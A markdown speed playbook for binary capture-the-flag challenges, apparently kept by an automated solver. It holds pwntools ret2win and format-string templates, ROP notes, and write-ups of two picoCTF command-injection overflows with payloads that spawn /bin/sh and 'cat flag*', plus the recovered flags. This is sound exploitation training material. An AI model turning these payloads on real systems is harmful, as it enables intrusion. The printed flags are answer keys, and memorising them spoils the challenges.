# ⚙️ Binary CTF Speed Playbook

> **Scope**: Buffer Overflow, Ret2win, Format String, ROP, Shellcode, Reverse Engineering.

---

## ⚡ 1. Rapid Triage (First 60s)

```bash
# 1. Inspect binary protections
checksec --file=<binary>

# 2. Search for embedded flags or win functions
strings <binary> | grep -iE "flag|win|shell|/bin/sh"

# 3. Targeted disassembly of main and win functions
objdump -d <binary> | grep -A 20 "<win>:"
```

---

## 🛠️ 2. Attack Vectors Matrix

| Protection Setup | Attack Strategy | 1st Snippet Target |
|---|---|---|
| **No Canary, No PIE** | Standard Ret2win / Buffer Overflow | Overwrite EIP/RIP with `win()` function address |
| **Format String (`printf(buf)`)** | Leak stack / Write to memory (`%n`) | `%p %p %p %p` or `%s` to leak flag |
| **NX Enabled, No PIE** | ROP Chain (`system("/bin/sh")`) | `pop rdi; ret` → `/bin/sh` string → `system()` |
| **Canary Enabled** | Leak Canary first, then overflow | Format string leak or byte-by-byte overwrite |

---

## 🎯 3. Proven Fast Payloads (Updated Automatically on Success)

### Template: `ctf-skills/templates/fmtstr_ret_pie.py`  *(PIE + FullRELRO + canary)*
Generic leak → %hn overwrite return address → trigger. Fill 4 fields, run.
```python
# Leak: send `%20$p.%21$p` to get saved_rbp and return_addr.
# PIE base = return_addr - 0x1413   (or whatever your `main+0x12` is)
# win_addr = PIE_base + <win_offset>
# target   = saved_rbp - 0x8        (rbp_echo + 8 = rbp_main - 0x8)
# Write 4 half-words via %hn, then send "exit\n" IMMEDIATELY (don't drain
# the %Nc padding output).
```

### pwntools `fmtstr_payload` (Faster alternative)
```python
from pwn import fmtstr_payload
payload  = fmtstr_payload(offset=6, writes={target_addr: win_addr},
                          write_size='short')
p.sendline(payload); p.sendline(b'exit\n')
```

### pwntools Ret2win Template (no PIE):
```python
from pwn import *
p = remote('<ip>', <port>)
payload = b'A' * <offset> + p64(<win_addr>)
p.sendline(payload)
p.interactive()
```

---

## ⚠️ 4. Failed Attempts & Avoidances (Learned Failures)

- **Do NOT wait for the `%Nc` padding output before sending the trigger.** The
  trigger (`exit\n` or anything that breaks the loop) needs to arrive before
  the binary exits the read syscall. Draining 45KB of padding wastes seconds.
  Send the trigger 200ms after the write payload, then `recvall` at the end.
- **Full RELRO = no GOT overwrite.** Check `checksec` (or `readelf -d | grep FLAGS`
  for `BIND_NOW`) BEFORE planning. If Full RELRO, plan a return-address overwrite,
  not a GOT overwrite. With a stack canary, the overflow path is closed; use
  format string `%hn` to write the return slot directly.
- **Avoid full manual Ghidra decompilation** if `objdump` / `gdb` shows the
  vulnerability in <30 seconds.
- **Ensure 16-byte stack alignment** (`ret` gadget) before `system()` calls on
  Ubuntu 18.04+.

## 🧠 5. Speed Optimizations (target ≤ 1 min)

1. **Pre-built templates in `ctf-skills/templates/`** — `fmtstr_ret_pie.py` for
   PIE+FullRELRO+canary, more to come. Fill 4 fields, run, flag in <30s of
   network time.
2. **Given source code? Skip `checksec` / deep `objdump`.** Read the source for
   the vuln (`printf(buf)`, `gets`, `strcpy`, etc.) and the win function. Run
   `objdump -d binary | grep -E "<win>:|<main>:"` for offsets only.
3. **One-shot leak.** Don't dump `%p.%p.%p...` to map the stack from scratch.
   For the standard `char buf[N]; fgets; printf(buf); ...; ret` shape, offsets
   19/20/21 = canary/saved_rbp/return_addr are correct 90% of the time.
4. **Send the trigger immediately** after the write payload. Do not wait.
5. **Parallelize recon.** `curl` source + binary in one command, then `strings`
   + `objdump` in parallel.

## picoCTF — Input Injection 2 (heap overflow into adjacent malloc'd command string)
- `scanf("%s", username)` (28-byte heap buf) overflows into `shell` chunk allocated right after; `system(shell)` runs attacker command.
- Chunk distance = shell_ptr - username_ptr from printed pointers (was 0x30/48 here, not 32). Use leaked pointers to size padding dynamically.
- Payload: `b'A'*<dist> + b'/bin/sh\n'` then send `ls; cat flag*` — %s can't contain spaces, so spawn /bin/sh and run spaced commands after.
- Flag: picoCTF{us3rn4m3_2_sh3ll_48b038ff}

### ✅ EASIER WAY (do this)
1. **Source given → read source FIRST, skip checksec/disasm entirely.** Vuln + win condition visible in 10s. (Saved ~30s here.)
2. **Program leaks pointers (`foo at %p`)? Parse them and compute offsets dynamically:**
   ```python
   pad = int(re.search(r"shell at (0x[0-9a-f]+)", banner).group(1), 16) \
       - int(re.search(r"username at (0x[0-9a-f]+)", banner).group(1), 16)
   ```
   Never derive heap layout from malloc-size math — allocator behavior varies.
3. **`scanf("%s")` / whitespace-limited input?** Inject `/bin/sh` (space-free) as the payload, then send spaced commands (`cat flag*`) AFTER the shell spawns.
4. **Wrap every recv in try/except** (timeout + ConnectionAborted/Reset) — remote close on program exit must not kill the script mid-flag.
5. **`cat flag*` with glob** — no need to know exact flag filename.

### ❌ AVOID (cost time here)
- **Hardcoding glibc chunk math**: assumed malloc(28)→0x20 chunks → 32B pad → FAIL. Real distance was 48B. Leaked pointers > theory.
- **Spaces in the overflow payload** (`cat flag.txt` directly) — `%s` truncates at whitespace. Shell first, commands second.
- **Single bare `recv()`** — data may not have arrived yet; loop until timeout.
- **Sending commands before the shell is up** — small `time.sleep(0.5)` between payload and follow-up commands.

## picoCTF — Input Injection 1 (stack overflow into adjacent command buffer)
- `fun(name, "uname")`: `char c[10]` at rbp-0xa, `char buffer[10]` at rbp-0x14; `strcpy(buffer, name)` overflows 10 bytes into `c`; `system(c)` runs attacker input.
- fgets (not %s) => SPACES ALLOWED in payload. Direct: `b'A'*10 + b'cat flag*\n'` — no /bin/sh needed.
- Offset from objdump: dist = c_addr - buffer_addr (here 0x14-0xa = 10). No canary check before system() => works even with stack protector.
- Flag: picoCTF{0v3rfl0w_c0mm4nd_a9259e7a}
